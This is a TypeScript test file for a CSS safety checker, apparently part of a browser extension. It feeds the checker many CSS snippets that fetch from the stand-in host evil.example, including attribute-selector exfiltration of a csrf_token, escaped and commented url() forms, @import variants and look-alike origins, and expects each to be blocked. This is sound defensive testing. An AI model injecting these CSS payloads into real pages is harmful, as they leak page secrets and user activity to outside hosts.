import { describe, expect, it } from 'vitest'
import { DEFAULT_SETTINGS } from '@shared/types'
import { assertPreviewable, checkCssForPage } from '../background/css-gate'
import { checkCss, hostOfPattern, modeForHost, policyKeyOfPattern, tokenize } from './css-check'

const PAGE = 'https://shop.example.com/cart'

const blocked = (css: string) => !checkCss(css, { mode: 'block', pageUrl: PAGE }).passed

/**
 * One entry per construct that can make the browser request something. Each
 * is blocked by default. The escaped and commented forms exist because a
 * regular expression for `url(` misses them, and the tokenizer is what is
 * being tested.
 */
const ATTACKS: Record<string, string> = {
  'unquoted url': 'a { background: url(https://evil.example/t) }',
  'double-quoted url': 'a { background: url("https://evil.example/t") }',
  'single-quoted url': "a { background: url('https://evil.example/t') }",
  'url with inner spaces': 'a { background: url(  https://evil.example/t  ) }',
  'uppercase URL': 'a { background: URL(https://evil.example/t) }',
  'attribute-selector exfiltration':
    'input[name=csrf_token][value^="a"] { background: url(https://evil.example/t?a) }',
  'protocol-relative url': 'a { background: url(//evil.example/t) }',
  'relative url': 'a { background: url(/track.gif) }',
  'fragment-only url': 'a { clip-path: url(#c) }',
  'blob url': 'a { background: url(blob:https://evil.example/1) }',
  'escaped letter in url': 'a { background: u\\rl(https://evil.example/t) }',
  'hex escape in url': 'a { background: \\75 rl(https://evil.example/t) }',
  'hex escape without space, six digits': 'a { background: \\000075rl(https://evil.example/t) }',
  'escaped url with a quoted argument': 'a { background: \\75 rl("https://evil.example/t") }',
  'escape inside the address': 'a { background: url(https://evil.example/\\74) }',
  'comment before the url': 'a { background: /* x */ url(https://evil.example/t) }',
  'comment between rules does not hide it': '/* url(data:,) */ a { background: url(https://evil.example/t) }',
  'newline between url( and quote': 'a { background: url(\n"https://evil.example/t") }',
  'tab inside the address': 'a { background: url("https://evil.example/\t") }',
  'url inside a custom property': ':root { --x: url(https://evil.example/t) } a { background: var(--x) }',
  'url inside a gradient list': 'a { background: linear-gradient(red, blue), url(https://evil.example/t) }',
  'url in an @media block': '@media (min-width: 1px) { a { background: url(https://evil.example/t) } }',
  'url in @supports': '@supports (display: grid) { a { background: url(https://evil.example/t) } }',
  'url in @keyframes': '@keyframes k { from { background: url(https://evil.example/t) } }',
  'cursor': 'a { cursor: url(https://evil.example/c.cur), auto }',
  'list-style': 'li { list-style: url(https://evil.example/t) inside }',
  'list-style-image': 'li { list-style-image: url(https://evil.example/t) }',
  'mask': 'a { mask: url(https://evil.example/t) }',
  'mask-image': 'a { -webkit-mask-image: url(https://evil.example/t) }',
  'border-image': 'a { border-image: url(https://evil.example/t) 30 round }',
  'content': 'a::after { content: url(https://evil.example/t) }',
  'content with text': 'a::after { content: "x" url(https://evil.example/t) }',
  'filter': 'a { filter: url(https://evil.example/t#f) }',
  'shape-outside': 'a { float: left; shape-outside: url(https://evil.example/t) }',
  'clip-path': 'a { clip-path: url(https://evil.example/t#c) }',
  '-moz-image-rect': 'a { background: -moz-image-rect(url(https://evil.example/t), 0, 1, 1, 0) }',
  '@font-face src': '@font-face { font-family: f; src: url(https://evil.example/f.woff2) }',
  '@font-face src after local': '@font-face { font-family: f; src: local(Arial), url(https://evil.example/f.woff2) format("woff2") }',
  '@font-face src escaped': '@font-face { font-family: f; src: \\75 rl(https://evil.example/f.woff2) }',
  'src() function': 'a { background: src("https://evil.example/t") }',
  'src() with an escape': 'a { background: s\\72 c("https://evil.example/t") }',
  'image-set bare string': 'a { background: image-set("https://evil.example/t" 1x) }',
  'image-set prefixed': 'a { background: -webkit-image-set("https://evil.example/t" 1x) }',
  'image-set with url': 'a { background: image-set(url(https://evil.example/t) 1x) }',
  'image-set second candidate': 'a { background: image-set("data:image/gif;base64,R0lGOD" 1x, "https://evil.example/t" 2x) }',
  'image-set escaped name': 'a { background: image-s\\65 t("https://evil.example/t" 1x) }',
  'image-set string from a variable':
    ':root { --x: "https://evil.example/t" } a { background: image-set(var(--x) 1x) }',
  'image() string': 'a { background: image("https://evil.example/t") }',
  'url taking a variable': 'a { background: url(var(--x)) }',
  'url with a malformed address': 'a { background: url(a b) }',
  '@import url': '@import url(https://evil.example/x.css);',
  '@import string': '@import "https://evil.example/x.css";',
  '@import escaped': '@\\69 mport "https://evil.example/x.css";',
  '@import uppercase': '@IMPORT "https://evil.example/x.css";',
  '@import with a media query': '@import url(x.css) screen and (min-width: 1px);',
  '@import data url': '@import url(data:text/css,a{color:red});',
  // A flag that skipped url() inside @namespace was cleared only by ";", so
  // each of these left every later url() unchecked.
  '@namespace block then url': '@namespace x{}a{background:url(https://evil.example/a)}',
  '@namespace block then quoted url': '@namespace x{}a{background:url("https://evil.example/a")}',
  '@namespace inside @media then url': '@media all{@namespace x}a{background:url(https://evil.example/a)}',
  '@namespace inside a rule then url': 'b{@namespace x}a{background:url(https://evil.example/a)}',
  '@namespace without a semicolon then url': '@namespace x a{background:url(https://evil.example/a)}',
  '@namespace with an external url': '@namespace svg url(http://www.w3.org/2000/svg); svg|a { color: red }',
}

const LEGITIMATE: Record<string, string> = {
  'colours and layout':
    '.nav { display: flex; color: #333; background-color: rgb(0 0 0 / 50%); margin: 0 auto; padding: 4px 8px }',
  gradient: 'a { background: linear-gradient(to right, red, blue) }',
  'radial gradient': 'a { background-image: radial-gradient(circle at 50% 50%, #fff, transparent 70%) }',
  'data image in url': 'a { background: url(data:image/png;base64,iVBORw0KGgo=) }',
  'quoted data image': 'a { background: url("data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\'/>") }',
  'uppercase DATA': 'a { background: URL(DATA:image/gif;base64,R0lGOD) }',
  'data in image-set': 'a { background: image-set("data:image/gif;base64,R0lGOD" 1x) }',
  'data in src()': 'a { background: src("data:image/gif;base64,R0lGOD") }',
  'data cursor': 'a { cursor: url(data:image/png;base64,iVBORw0KGgo=) 4 4, pointer }',
  'custom properties': ':root { --accent: #08f; --gap: 8px } a { color: var(--accent); margin: var(--gap) }',
  'custom property holding a string': ':root { --label: "hello" } a::after { content: var(--label) }',
  '@media': '@media (max-width: 600px) { .sidebar { display: none } }',
  '@supports': '@supports (display: grid) { .g { display: grid } }',
  '@keyframes': '@keyframes spin { from { transform: rotate(0) } to { transform: rotate(360deg) } }',
  '@font-face with local only': '@font-face { font-family: Mine; src: local("Arial"), local(Helvetica) }',
  'font format string is not a url': 'a { font-family: Mine } @font-face { font-family: Mine; src: local(Arial) format("woff2") }',
  'string content': 'a::after { content: "url(https://evil.example/t)" }',
  'url text in a comment': '/* url(https://evil.example/t) @import "x"; */ a { color: red }',
  'text containing url( inside a string': 'a::before { content: "see url(x)" }',
  'url-like identifier': 'a { background: myurl(foo) }',
  'attribute selector': 'input[name=q][value^="a"] { outline: 1px solid red }',
  '@namespace with a data url': '@namespace svg url(data:text/plain,x); svg|a { color: red }',
  '@namespace with a string': '@namespace "http://www.w3.org/1999/xhtml"; a { color: red }',
  'gradient with a var': 'a { background: linear-gradient(var(--a), var(--b)) }',
  'image-set with only a gradient': 'a { background: image-set(linear-gradient(red, blue) 1x) }',
  'filter without url': 'a { filter: blur(2px) drop-shadow(0 0 4px #000) }',
  'mask without url': 'a { mask-image: linear-gradient(black, transparent) }',
  empty: '',
}

describe('checkCss in the default mode', () => {
  for (const [name, css] of Object.entries(ATTACKS)) {
    it(`blocks ${name}`, () => {
      expect(blocked(css)).toBe(true)
    })
  }

  for (const [name, css] of Object.entries(LEGITIMATE)) {
    it(`passes ${name}`, () => {
      const result = checkCss(css, { mode: 'block', pageUrl: PAGE })
      expect(result.findings).toEqual([])
      expect(result.passed).toBe(true)
    })
  }

  it('reports the line and column of the offending url', () => {
    const result = checkCss('a { color: red }\n\nb {\n  background: url(https://evil.example/t)\n}', {
      mode: 'block',
      pageUrl: PAGE,
    })
    expect(result.findings).toHaveLength(1)
    expect(result.findings[0]).toMatchObject({ line: 4, column: 15, api: 'url()', severity: 'block' })
  })

  it('reports each offending url separately', () => {
    const result = checkCss('a{background:url(http://a.example/1)} b{background:url(http://b.example/2)}', {
      mode: 'block',
      pageUrl: PAGE,
    })
    expect(result.findings).toHaveLength(2)
  })

  it('fails closed with no page url', () => {
    expect(checkCss('a{background:url(/x.png)}', { mode: 'same-origin' }).passed).toBe(false)
  })
})

describe('tokenize', () => {
  it('decodes escapes in function names', () => {
    expect(tokenize('u\\rl("x")')[0]).toMatchObject({ type: 'function', value: 'url' })
    expect(tokenize('\\75 rl(x)')[0]).toMatchObject({ type: 'url', value: 'x' })
  })

  it('skips comments, including an unterminated one', () => {
    expect(tokenize('/* a */b/* c').filter((t) => t.type !== 'whitespace')).toHaveLength(1)
  })

  it('treats a backslash before a newline as not an escape', () => {
    expect(tokenize('u\\\nrl(x)').some((t) => t.type === 'url')).toBe(false)
  })
})

describe('same-origin mode', () => {
  const run = (css: string) => checkCss(css, { mode: 'same-origin', pageUrl: PAGE })

  it('allows a relative url and an absolute url on the page origin', () => {
    expect(run('a{background:url(/img/a.png)}').passed).toBe(true)
    expect(run('a{background:url(https://shop.example.com/b.png)}').passed).toBe(true)
    expect(run('a{background:image-set("c.png" 1x)}').passed).toBe(true)
  })

  it('blocks other origins, including look-alikes', () => {
    expect(run('a{background:url(https://evil.example/t)}').passed).toBe(false)
    expect(run('a{background:url(//evil.example/t)}').passed).toBe(false)
    expect(run('a{background:url(http://shop.example.com/t)}').passed).toBe(false)
    expect(run('a{background:url(https://shop.example.com.evil.example/t)}').passed).toBe(false)
    expect(run('a{background:url(https://shop.example.com@evil.example/t)}').passed).toBe(false)
    expect(run('a{background:url(https://sub.shop.example.com/t)}').passed).toBe(false)
  })

  it('still blocks @import, even for a same-origin file', () => {
    expect(run('@import url(/x.css);').passed).toBe(false)
    expect(run('@import "/x.css";').passed).toBe(false)
  })
})

describe('list-external mode', () => {
  const css = 'a{background:url(https://cdn.example/a.png)} b{background:url(/own.png)}'

  it('lists external urls as pending and does not pass', () => {
    const result = checkCss(css, { mode: 'list-external', pageUrl: PAGE })
    expect(result.findings).toEqual([])
    expect(result.pendingUrls).toEqual(['https://cdn.example/a.png'])
    expect(result.passed).toBe(false)
  })

  it('passes once exactly those urls are approved', () => {
    const result = checkCss(css, {
      mode: 'list-external',
      pageUrl: PAGE,
      approvedUrls: ['https://cdn.example/a.png'],
    })
    expect(result.passed).toBe(true)
    expect(result.externalUrls).toEqual(['https://cdn.example/a.png'])
  })

  it('does not pass for a url that was not the one approved', () => {
    const result = checkCss(css, {
      mode: 'list-external',
      pageUrl: PAGE,
      approvedUrls: ['https://other.example/a.png'],
    })
    expect(result.passed).toBe(false)
  })

  it('never lists @import, which stays blocking', () => {
    const result = checkCss('@import url(https://cdn.example/x.css);', {
      mode: 'list-external',
      pageUrl: PAGE,
      approvedUrls: ['https://cdn.example/x.css'],
    })
    expect(result.passed).toBe(false)
    expect(result.findings[0]?.api).toBe('@import')
  })

  it('still blocks a url that cannot be read as a plain string', () => {
    expect(checkCss('a{background:url(var(--x))}', { mode: 'list-external', pageUrl: PAGE }).passed).toBe(false)
  })
})

describe('per-site mode lookup', () => {
  it('uses the most specific key, and a wildcard key covers the host itself and its subdomains', () => {
    const policy = { '*.example.com': 'same-origin', 'shop.example.com': 'list-external' } as const
    expect(modeForHost(policy, 'shop.example.com')).toBe('list-external')
    expect(modeForHost(policy, 'www.example.com')).toBe('same-origin')
    expect(modeForHost(policy, 'example.com')).toBe('same-origin')
    expect(modeForHost(policy, 'a.b.example.com')).toBe('same-origin')
    expect(modeForHost(policy, 'example.org')).toBe('block')
    expect(modeForHost(undefined, 'example.com')).toBe('block')
  })

  it('does not extend an exact-host key to subdomains', () => {
    // A key from a pattern such as `shop.example.com/*` names that host only.
    const policy = { 'shop.example.com': 'same-origin' } as const
    expect(modeForHost(policy, 'shop.example.com')).toBe('same-origin')
    expect(modeForHost(policy, 'cdn.shop.example.com')).toBe('block')
    expect(modeForHost(policy, 'example.com')).toBe('block')
  })

  it('prefers an exact key over a wildcard key for the same host', () => {
    const policy = { '*.example.com': 'same-origin', 'example.com': 'block' } as const
    expect(modeForHost(policy, 'example.com')).toBe('block')
    expect(modeForHost(policy, 'www.example.com')).toBe('same-origin')
  })

  it('does not match a host that only ends in the same letters', () => {
    expect(modeForHost({ '*.example.com': 'same-origin' }, 'notexample.com')).toBe('block')
  })

  it('ignores a wildcard key for a public suffix, even one written into settings by hand', () => {
    const policy = { '*.com': 'list-external', '*.co.uk': 'same-origin', '*.github.io': 'same-origin' } as const
    expect(modeForHost(policy, 'example.com')).toBe('block')
    expect(modeForHost(policy, 'shop.example.co.uk')).toBe('block')
    expect(modeForHost(policy, 'someone.github.io')).toBe('block')
    // Control: the same keys one label longer are ordinary sites and do apply.
    expect(modeForHost({ '*.example.co.uk': 'same-origin' }, 'shop.example.co.uk')).toBe('same-origin')
    expect(modeForHost({ '*.someone.github.io': 'same-origin' }, 'a.someone.github.io')).toBe('same-origin')
  })

  it('reads the host from a match pattern', () => {
    expect(hostOfPattern('*.reddit.com/r/x*')).toBe('reddit.com')
    expect(hostOfPattern('shop.example.com/*')).toBe('shop.example.com')
    expect(hostOfPattern('*/foo')).toBeNull()
  })

  it('reads the host and the key from a pattern that starts with a scheme (#50)', () => {
    // Before the fix the host was the text before the first slash, which is `https:`.
    expect(hostOfPattern('https://shop.example.com/*')).toBe('shop.example.com')
    expect(hostOfPattern('*://*.reddit.com/r/x*')).toBe('reddit.com')
    expect(hostOfPattern('http://localhost/*')).toBe('localhost')
    expect(hostOfPattern('https://*/foo')).toBeNull()
    expect(policyKeyOfPattern('https://shop.example.com/*')).toBe('shop.example.com')
    expect(policyKeyOfPattern('https://*.example.com/*')).toBe('*.example.com')
    expect(policyKeyOfPattern('*://*.Example.COM/*')).toBe('*.example.com')
    expect(policyKeyOfPattern('https://*.com/*')).toBeNull()
    expect(policyKeyOfPattern('https://*.*.example.com/*')).toBeNull()
  })

  it('derives the key from the pattern and keeps whether it covers subdomains', () => {
    expect(policyKeyOfPattern('*.reddit.com/r/x*')).toBe('*.reddit.com')
    expect(policyKeyOfPattern('shop.example.com/*')).toBe('shop.example.com')
    expect(policyKeyOfPattern('*.Example.COM/*')).toBe('*.example.com')
    expect(policyKeyOfPattern('localhost/*')).toBe('localhost')
    expect(policyKeyOfPattern('*/foo')).toBeNull()
    expect(policyKeyOfPattern('*.*.example.com/*')).toBeNull()
  })

  it('refuses a key that would cover a whole public suffix', () => {
    for (const pattern of ['*.com/*', '*.org/*', '*.uk/*', '*.co.uk/*', '*.com.au/*', '*.github.io/*', '*.blogspot.com/*']) {
      expect(policyKeyOfPattern(pattern), pattern).toBeNull()
    }
    // An exact host is one site even when its name is a suffix, and a registrable name is allowed.
    expect(policyKeyOfPattern('github.io/*')).toBe('github.io')
    expect(policyKeyOfPattern('*.example.co.uk/*')).toBe('*.example.co.uk')
    expect(policyKeyOfPattern('*.someone.github.io/*')).toBe('*.someone.github.io')
  })
})

describe('checkCssForPage', () => {
  const settings = { ...DEFAULT_SETTINGS, cssUrlPolicy: { '*.example.com': 'list-external' as const } }

  it('uses the site mode from settings and returns the panel shape', () => {
    const css = 'a{background:url(https://cdn.example/a.png)}'
    const result = checkCssForPage(css, settings, PAGE, undefined)
    expect(result.passed).toBe(false)
    expect(result.pendingUrls).toEqual(['https://cdn.example/a.png'])
    expect(result.static).toEqual([])
  })

  it('blocks on a site with no setting', () => {
    const result = checkCssForPage('a{background:url(https://cdn.example/a.png)}', DEFAULT_SETTINGS, PAGE, undefined)
    expect(result.passed).toBe(false)
    expect(result.static).toHaveLength(1)
  })
})

describe('assertPreviewable', () => {
  const attack = 'input[name=csrf_token][value^="a"] { background: url(https://evil.example/t?a) }'

  it('refuses CSS that fails the check', () => {
    expect(() => assertPreviewable(attack, DEFAULT_SETTINGS, PAGE, undefined)).toThrow(/load/)
  })

  it('refuses CSS that is only waiting for approval', () => {
    const settings = { ...DEFAULT_SETTINGS, cssUrlPolicy: { '*.example.com': 'list-external' as const } }
    expect(() => assertPreviewable(attack, settings, PAGE, undefined)).toThrow(/not approved/)
  })

  it('allows the same CSS once its address is approved', () => {
    const settings = { ...DEFAULT_SETTINGS, cssUrlPolicy: { '*.example.com': 'list-external' as const } }
    expect(() =>
      assertPreviewable(attack, settings, PAGE, ['https://evil.example/t?a']),
    ).not.toThrow()
  })

  it('allows ordinary CSS', () => {
    expect(() =>
      assertPreviewable('a { color: red; background: linear-gradient(red, blue) }', DEFAULT_SETTINGS, PAGE, undefined),
    ).not.toThrow()
  })
})
